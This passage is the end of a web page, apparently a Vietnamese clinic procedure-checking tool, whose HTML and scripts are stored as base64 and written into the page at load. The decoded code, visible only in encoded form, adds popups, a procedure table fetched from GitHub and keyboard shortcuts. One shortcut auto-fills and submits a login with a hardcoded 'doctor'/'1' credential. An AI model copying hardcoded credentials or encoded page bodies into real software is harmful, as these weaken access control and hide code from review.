Jhc2UgbW9kYWwtc21hbGwiPg0KICA8ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuOw0KICAgICAgICAgICAgcGFkZGluZzoxNHB4IDE2cHg7Ym9yZGVyLWJvdHRvbToxcHggc29saWQgI2U1ZTdlYiI+DQogIDxoMyBzdHlsZT0ibWFyZ2luOjA7Zm9udC1zaXplOjE4cHgiPkLhuqNuZyBUdeG7syBiaeG6v24gVGjhu6cgdGh14bqtdDwvaDM+DQogIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OmZsZXgtZW5kO2dhcDo2cHg7Ij4NCiAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJzaG93Tm9QZXJtaXNzaW9uKCkiDQogICAgICAgICAgc3R5bGU9InBhZGRpbmc6OHB4IDE0cHg7Zm9udC1zaXplOjEzcHg7Ym9yZGVyLXJhZGl1czo0cHg7Ij4NCiAgICBUaMOqbQ0KICA8L2J1dHRvbj4NCiAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJjbG9zZUN1c3RvbWl6ZVBhbmVsKCkiDQogICAgICAgICAgc3R5bGU9InBhZGRpbmc6OHB4IDE0cHg7Zm9udC1zaXplOjEzcHg7Ym9yZGVyLXJhZGl1czo0cHg7Ij4NCiAgICDEkMOzbmcNCiAgPC9idXR0b24+DQo8L2Rpdj4NCjwvZGl2Pg0KICAgIDxkaXYgc3R5bGU9InBhZGRpbmc6MHB4IDE2cHgiPg0KICAgIA0KICAgICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSIgc3R5bGU9IndpZHRoOjEwMCUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgPHRyPg0KICAgICAgICAgICAgPHRoIHN0eWxlPSJ3aWR0aDo2MHB4Ij5TVFQ8L3RoPg0KICAgICAgICAgICAgPHRoPlRo4bunIFRodeG6rXQ8L3RoPg0KICAgICAgICAgICAgPHRoIHN0eWxlPSJ3aWR0aDoxMzBweCI+VGjhu51pIGdpYW48L3RoPg0KICAgICAgICAgICAgPHRoIHN0eWxlPSJ3aWR0aDoxMTBweCI+Q2h14bqpbiBi4buLPC90aD4NCiAgICAgICAgICA8L3RyPg0KICAgICAgICA8L3RoZWFkPg0KICAgICAgICA8dGJvZHkgaWQ9ImN1c3RvbWl6ZUJvZHkiPjwvdGJvZHk+DQogICAgICA8L3RhYmxlPg0KICANCiAgPC9kaXY+DQo8L2Rpdj4NCjxzY3JpcHQ+DQogIGNvbnN0IFRIVVRIVUFUX1VSTCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4vY2hhdV90aHV0aHVhdC50eHQnOw0KDQogIGFzeW5jIGZ1bmN0aW9uIG9wZW5DdXN0b21pemVQYW5lbCgpIHsNCiAgICB0cnkgew0KICAgICAgaWYgKCF3aW5kb3cuUFJPQ0VEVVJFUyB8fCBPYmplY3Qua2V5cyh3aW5kb3cuUFJPQ0VEVVJFUykubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKFRIVVRIVUFUX1VSTCk7DQogICAgICAgIGNvbnN0IHRleHQgPSBhd2FpdCByZXMudGV4dCgpOw0KICAgICAgICB3aW5kb3cuUFJPQ0VEVVJFUyA9IEpTT04ucGFyc2UodGV4dCk7DQogICAgICB9DQogICAgfSBjYXRjaCAoZSkgew0KICAgICAgYWxlcnQoJ0tow7RuZyB0aOG7gyB04bqjaSBkYW5oIHPDoWNoIHRo4bunIHRodeG6rXQgdOG7qyBtw6F5IGNo4bunLicpOw0KICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIGNvbnN0IHJvd3MgPSBbXTsNCiAgICBPYmplY3QuZW50cmllcyhQUk9DRURVUkVTKS5mb3JFYWNoKChbbmFtZSwgY2ZnXSkgPT4gew0KICAgICAgaWYgKCFuYW1lIHx8ICFjZmcpIHJldHVybjsNCg0KICAgLy8gdHLGsOG7m2MgxJHDszoNCmxldCBkdXJhdGlvbiA9ICh0eXBlb2YgY2ZnLmR1cmF0aW9uID09PSAnbnVtYmVyJykgPyBjZmcuZHVyYXRpb24gOiAnJzsNCi8vIE7hur91IGPDsyBwcmVwIHRow6wgbOG6pXkgcHJlcCwgbuG6v3Uga2jDtG5nIGPDsyB0aMOsIGfDoW4gPSBkdXJhdGlvbg0KbGV0IHByZXAgPSAodHlwZW9mIGNmZy5wcmVwID09PSAnbnVtYmVyJykgPyBjZmcucHJlcCA6IGR1cmF0aW9uOw0KDQovLyDDqXAgcmnDqm5nIGNobyAiU+G6r2MgdGh14buRYyB0aGFuZyINCmlmIChuYW1lLnRyaW0oKS50b0xvd2VyQ2FzZSgpLmluY2x1ZGVzKCdz4bqvYyB0aHXhu5FjIHRoYW5nJykpIHsNCiAgZHVyYXRpb24gPSAxMjA7DQogIHByZXAgPSAxMjA7DQp9DQoNCg0KICAgICAgaWYgKGR1cmF0aW9uICE9PSAnJykgew0KICAgICAgICByb3dzLnB1c2goeyBuYW1lLCBkdXJhdGlvbiwgcHJlcCB9KTsNCiAgICAgIH0NCiAgICB9KTsNCg0KICAgIHJvd3Muc29ydCgoYSxiKSA9PiBhLm5hbWUubG9jYWxlQ29tcGFyZShiLm5hbWUsICd2aScpKTsNCg0KICAgIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2N1c3RvbWl6ZUJvZHknKTsNCiAgICB0Ym9keS5pbm5lckhUTUwgPSByb3dzLm1hcCgociwgaWR4KSA9PiBgDQogICAgICA8dHI+DQogICAgICAgIDx0ZCBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXIiPiR7aWR4ICsgMX08L3RkPg0KICAgICAgICA8dGQ+JHtyLm5hbWV9PC90ZD4NCiAgICAgICAgPHRkIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlciI+JHtyLmR1cmF0aW9ufTwvdGQ+DQogICAgICAgIDx0ZCBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXIiPiR7ci5wcmVwfTwvdGQ+DQogICAgICA8L3RyPg0KICAgIGApLmpvaW4oJycpOw0KDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2N1c3RvbWl6ZU1vZGFsJykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogIH0NCg0KICBmdW5jdGlvbiBjbG9zZUN1c3RvbWl6ZVBhbmVsKCkgew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjdXN0b21pemVNb2RhbCcpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogIH0NCjwvc2NyaXB0Pg0KPHNjcmlwdD4NCmZ1bmN0aW9uIHNob3dOb1Blcm1pc3Npb24oKSB7DQogIC8vIE92ZXJsYXkNCiAgY29uc3Qgb3ZlcmxheSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBvdmVybGF5LnN0eWxlLmNzc1RleHQgPSBgDQogICAgcG9zaXRpb246Zml4ZWQ7aW5zZXQ6MDtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KTsNCiAgICBkaXNwbGF5OmZsZXg7anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7ei1pbmRleDoxMjAwMDsNCiAgYDsNCg0KICAvLyBCb3gNCiAgY29uc3QgYm94ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIGJveC5zdHlsZS5jc3NUZXh0ID0gYA0KICAgIGJhY2tncm91bmQ6I2ZmZjtwYWRkaW5nOjIwcHggMzBweDtib3JkZXItcmFkaXVzOjEwcHg7DQogICAgdGV4dC1hbGlnbjpjZW50ZXI7bWF4LXdpZHRoOjMyMHB4O2JveC1zaGFkb3c6MCA0cHggMTVweCByZ2JhKDAsMCwwLDAuMyk7DQogICAgZm9udC1mYW1pbHk6SW50ZXIsc2Fucy1zZXJpZjsNCiAgYDsNCiAgYm94LmlubmVySFRNTCA9IGANCiAgICA8ZGl2IHN0eWxlPSJmb250LXNpemU6MThweDtmb250LXdlaWdodDo2MDA7Y29sb3I6I2U3NGMzYzttYXJnaW4tYm90dG9tOjEwcHg7Ij4NCiAgICAgIPCfmqsgQuG6oW4ga2jDtG5nIGPDsyBxdXnhu4FuIHRow6ptIHRo4bunIHRodeG6rXQNCiAgICA8L2Rpdj4NCiAgICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQodGhpcy5jbG9zZXN0KCcubm9QZXJtT3ZlcmxheScpKSI+DQogICAgICDEkMOzbmcNCiAgICA8L2J1dHRvbj4NCiAgYDsNCiAgb3ZlcmxheS5jbGFzc0xpc3QuYWRkKCJub1Blcm1PdmVybGF5Iik7DQogIG92ZXJsYXkuYXBwZW5kQ2hpbGQoYm94KTsNCiAgb3ZlcmxheS5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGUgPT4gew0KICAgIGlmIChlLnRhcmdldCA9PT0gb3ZlcmxheSkgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChvdmVybGF5KTsNCiAgfSk7DQogIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQob3ZlcmxheSk7DQp9DQoNCg0KDQo8L3NjcmlwdD4NCg0KDQoNCg0KDQoNCg0KDQoNCg0KPHNjcmlwdD4NCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oZSkgew0KICBpZiAoZS50YXJnZXQgJiYgZS50YXJnZXQuaWQgPT09ICJidXkiKSB7DQogICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidXlQb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7DQogIH0NCn0pOw0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbihlKSB7DQogIC8vIE3hu58gcG9wdXAgYuG6o25nIGdpw6EgbuG6v3UgY2xpY2sgdsOgbyBuw7p0IGlkPWJ1eQ0KICBpZiAoZS50YXJnZXQgJiYgZS50YXJnZXQuaWQgPT09ICJidXkiKSB7DQogICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidXlQb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7DQogICAgcmV0dXJuOw0KICB9DQoNCiAgLy8gxJDDs25nIHBvcHVwIGtoaSBjbGljayByYSBuZ2/DoGkgcGjhuqduIG7hu5lpIGR1bmcNCiAgY29uc3QgcG9wdXBzID0gWyJidXlQb3B1cCIsICJwYXltZW50UG9wdXAiLCAiY29uZmlybVBvcHVwIl07DQogIHBvcHVwcy5mb3JFYWNoKGlkID0+IHsNCiAgICBjb25zdCBwb3B1cCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkKTsNCiAgICBpZiAocG9wdXAgJiYgcG9wdXAuc3R5bGUuZGlzcGxheSA9PT0gImZsZXgiICYmIGUudGFyZ2V0ID09PSBwb3B1cCkgew0KICAgICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCiAgICB9DQogIH0pOw0KfSk7DQoNCi8vIMSQaeG7gXUgaMaw4bubbmcgbmhhbmggYuG6sW5nIHBow61tIHPhu5ENCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2tleWRvd24nLCBmdW5jdGlvbihlKSB7DQogICAgaWYgKGUuY29kZSA9PT0gIkY3Iikgew0KICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7DQogICAgICAgIGNvbnN0IGNoZWNrYm94ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dNb3JlU3VnZ2VzdGlvbnNDaGVja2JveCcpOw0KICAgICAgICBpZiAoY2hlY2tib3gpIHsNCiAgICAgICAgICAgIGNoZWNrYm94LmNoZWNrZWQgPSAhY2hlY2tib3guY2hlY2tlZDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gS8OtY2ggaG/huqF0IHPhu7Ega2nhu4duIGNoYW5nZSDEkeG7gyBj4bqtcCBuaOG6rXQgZ2lhbyBkaeG7h24NCiAgICAgICAgICAgIGNvbnN0IGV2ZW50ID0gbmV3IEV2ZW50KCdjaGFuZ2UnKTsNCiAgICAgICAgICAgIGNoZWNrYm94LmRpc3BhdGNoRXZlbnQoZXZlbnQpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICANCiAgICAgICAgfQ0KICAgIH0NCiAgICANCiAgICAvLyBGNyAtIFRvZ2dsZSBjaGVja2JveCAiSGnhu4NuIHRo4buLIELDoWMgc8SpIGNo4buJIMSR4buLbmgiDQogICAgaWYgKGUuY29kZSA9PT0gIkY4Iikgew0KICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7DQogICAgICAgIGNvbnN0IGNoZWNrYm94ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpOw0KICAgICAgICBpZiAoY2hlY2tib3gpIHsNCiAgICAgICAgICAgIGNoZWNrYm94LmNoZWNrZWQgPSAhY2hlY2tib3guY2hlY2tlZDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gS8OtY2ggaG/huqF0IHPhu7Ega2nhu4duIGNoYW5nZSDEkeG7gyBj4bqtcCBuaOG6rXQgZ2lhbyBkaeG7h24NCiAgICAgICAgICAgIGNvbnN0IGV2ZW50ID0gbmV3IEV2ZW50KCdjaGFuZ2UnKTsNCiAgICAgICAgICAgIGNoZWNrYm94LmRpc3BhdGNoRXZlbnQoZXZlbnQpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICANCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIC8vID09PT0gTUFQIEPDgUMgQuG6ok5HID09PT0NCiAgICBjb25zdCBzZWN0aW9uTWFwID0gew0KICAgICAgICAiRjEiOiAiZXJyb3JTZWN0aW9uIiwNCiAgICAgICAgIkYyIjogInJlc3VsdFNlY3Rpb24iLA0KICAgICAgICAiRjMiOiAibWFjaGluZUVycm9yU2VjdGlvbiIsDQogICAgICAgICJGNCI6ICJtYWNoaW5lQ29uZmxpY3RTZWN0aW9uIiwNCiAgICAgICAgIkY1IjogIm1pc3NpbmdNYWNoaW5lU2VjdGlvbiIsDQoJCSJGNiI6ICJkYXRlTWlzbWF0Y2hTZWN0aW9uIg0KICAgIH07DQoNCiAgICAvLyA9PT09IFNwYWNlIOKGkiBSZWxvYWQgdHJhbmcgPT09PQ0KICAgIGlmIChlLmNvZGUgPT09ICJTcGFjZSIpIHsNCiAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgICAgICBsb2NhdGlvbi5yZWxvYWQoKTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KDQogICAgLy8gPT09PSBDdHJsICsgTyDihpIgTeG7nyBmaWxlID09PT0NCiAgICBpZiAoZS5jdHJsS2V5ICYmICFlLnNoaWZ0S2V5ICYmIGUua2V5LnRvTG93ZXJDYXNlKCkgPT09ICJvIikgew0KICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7DQogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0cmlnZ2VyQnV0dG9uIik/LmNsaWNrKCk7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICAvLyA9PT09IEN0cmwgKyBTaGlmdCArIE8g4oaSIE3hu58gdGjGsCBt4bulYyA9PT09DQogICAgaWYgKGUuY3RybEtleSAmJiBlLnNoaWZ0S2V5ICYmIGUua2V5LnRvTG93ZXJDYXNlKCkgPT09ICJvIikgew0KICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7DQogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJmb2xkZXJCdG4iKT8uY2xpY2soKTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIC8vID09PT0gTuG6v3Uga2jDtG5nIHBo4bqjaSBGMeKAk0Y1IHRow6wgYuG7jyBxdWEgPT09PQ0KICAgIGlmICghWyJGMSIsIkYyIiwiRjMiLCJGNCIsIkY1IiwiRjYiXS5pbmNsdWRlcyhlLmtleSkpIHJldHVybjsNCg0KICAgIGNvbnN0IHRhcmdldElkID0gc2VjdGlvbk1hcFtlLmtleV07DQogICAgY29uc3QgdGFyZ2V0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQodGFyZ2V0SWQpOw0KICAgIGlmICghdGFyZ2V0KSByZXR1cm47DQoNCiAgICAvLyDinIUgTuG6v3UgQ2Fwc0xvY2sgYuG6rXQg4oaSIOG6qG4gaOG6v3QgJiBjaOG7iSBoaeG7h24gMSBi4bqjbmcNCiAgICBpZiAoZS5nZXRNb2RpZmllclN0YXRlKCJDYXBzTG9jayIpKSB7DQogICAgICAgIE9iamVjdC52YWx1ZXMoc2VjdGlvbk1hcCkuZm9yRWFjaChzZWMgPT4gew0KICAgICAgICAgICAgY29uc3QgZWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChzZWMpOw0KICAgICAgICAgICAgaWYgKGVsKSBlbC5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICB9KTsNCiAgICAgICAgdGFyZ2V0LnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgIH0NCg0KICAgIC8vIOKchSBMdcO0biBzY3JvbGwgdOG7m2kgYuG6o25nDQogICAgdGFyZ2V0LnNjcm9sbEludG9WaWV3KHsgYmVoYXZpb3I6ICdzbW9vdGgnLCBibG9jazogJ3N0YXJ0JyB9KTsNCg0KfSk7DQoNCg0KLy8gVGjDqm0gc+G7sSBraeG7h24gY2hvIGNoZWNrYm94IHNob3dEb2N0b3IgxJHhu4MgY+G6rXAgbmjhuq10IHThuqV0IGPhuqMgY8OhYyBi4bqjbmcNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbigpIHsNCiAgICAvLyBD4bqtcCBuaOG6rXQgY8OhYyBi4bqjbmcgbcOheQ0KICAgIGlmIChtYWNoaW5lRXJyb3JMb2cubGVuZ3RoID4gMCkgZGlzcGxheU1hY2hpbmVFcnJvcnMoKTsNCiAgICBpZiAobWFjaGluZUNvbmZsaWN0TG9nLmxlbmd0aCA+IDApIGRpc3BsYXlNYWNoaW5lQ29uZmxpY3RzKCk7DQogICAgaWYgKG1pc3NpbmdNYWNoaW5lTG9nLmxlbmd0aCA+IDApIGRpc3BsYXlNaXNzaW5nTWFjaGluZUVycm9ycygpOw0KCWlmIChkYXRlTWlzbWF0Y2hMb2cubGVuZ3RoID4gMCkgZGlzcGxheURhdGVNaXNtYXRjaEVycm9ycygpOw0KfSk7DQovLyA9PT09IEY5IOKGkiBU4buxIMSR4buZbmcgxJHEg25nIG5o4bqtcCBkb2N0b3IgPT09PQ0KLy8gU+G7sSBraeG7h24gRjkgY2hvIMSRxINuZyBuaOG6rXAgdOG7sSDEkeG7mW5nDQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdrZXlkb3duJywgZnVuY3Rpb24oZSkgew0KICAgIGlmIChlLmNvZGUgPT09ICJGOSIpIHsNCiAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgICAgICANCiAgICAgICAgLy8gS2nhu4NtIHRyYSB4ZW0gY8OzIMSRYW5nIOG7nyB0cmFuZyDEkcSDbmcgbmjhuq1wIGtow7RuZw0KICAgICAgICBjb25zdCBsb2dpblNlY3Rpb24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5TZWN0aW9uJyk7DQogICAgICAgIGlmIChsb2dpblNlY3Rpb24gJiYgbG9naW5TZWN0aW9uLnN0eWxlLmRpc3BsYXkgIT09ICdub25lJykgew0KICAgICAgICAgICAgLy8gxJBp4buBbiB0aMO0bmcgdGluIMSRxINuZyBuaOG6rXANCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykudmFsdWUgPSAnZG9jdG9yJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZElucHV0JykudmFsdWUgPSAnMSc7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIFThu7EgxJHhu5luZyBi4bqlbSDEkcSDbmcgbmjhuq1wDQogICAgICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5CdG4nKS5jbGljaygpOw0KICAgICAgICAgICAgfSwgMTAwKTsNCiAgICAgICAgfQ0KICAgIH0NCn0pOw0KDQo8L3NjcmlwdD4NCg0KPC9odG1sPg==";
  const binary = atob(base64);
  const bytes = new Uint8Array([...binary].map(c => c.charCodeAt(0)));
  const decoded = new TextDecoder("utf-8").decode(bytes);
  document.write(decoded);
</script>
</body>
</html>
